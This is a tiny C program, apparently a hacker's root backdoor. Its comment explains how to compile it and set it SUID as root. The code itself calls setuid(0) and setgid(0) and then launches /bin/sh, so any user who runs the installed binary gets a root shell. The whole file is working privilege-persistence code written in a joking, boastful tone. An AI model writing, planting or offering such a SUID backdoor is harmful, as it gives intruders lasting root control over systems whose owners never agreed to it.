/*
i am pretty terrible at coding, so here's some terrible code!
This needs to be compiled and then set the binary SUID with sticky bit (as root obviously).

gcc -o r00t r00t.c;chmod +s r00t;echo lol super 31337 y000

*/

#include <stdlib.h>
#include <unistd.h>

int main(void)

{
setuid(0);
setgid(0);
system("/bin/sh");
}
